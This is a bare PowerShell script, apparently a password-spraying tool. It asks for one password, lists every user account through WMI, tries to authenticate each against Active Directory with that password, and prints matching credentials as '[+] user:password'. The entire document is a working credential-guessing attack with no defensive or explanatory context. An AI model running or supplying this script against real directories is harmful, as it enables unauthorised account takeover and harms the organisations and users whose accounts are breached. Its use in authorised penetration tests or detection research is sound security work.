Function Test-ADConnection {
    param(
        $username,
        $password)   
    return (New-Object DirectoryServices.DirectoryEntry "",$username,$password).psbase.name -ne $null
}
$password = Read-Host 'Enter A Password'
$Counter = 0 
$total = (Get-WmiObject -Class Win32_UserAccount | Measure-Object).Count
Get-WmiObject -Class Win32_UserAccount | ForEach-Object{
    $UserName = $_.Caption
    $auth = Test-ADConnection -username $UserName -password $password
    if($auth -eq "True"){
        Write-Host -ForegroundColor Green ("[+] {0}:{1}" -f $UserName,$password)
    }
    Write-Progress -Activity "In Progress" -Status  "$Counter/$total Completed" -PercentComplete($Counter/$total*100)
    $Counter++    
}
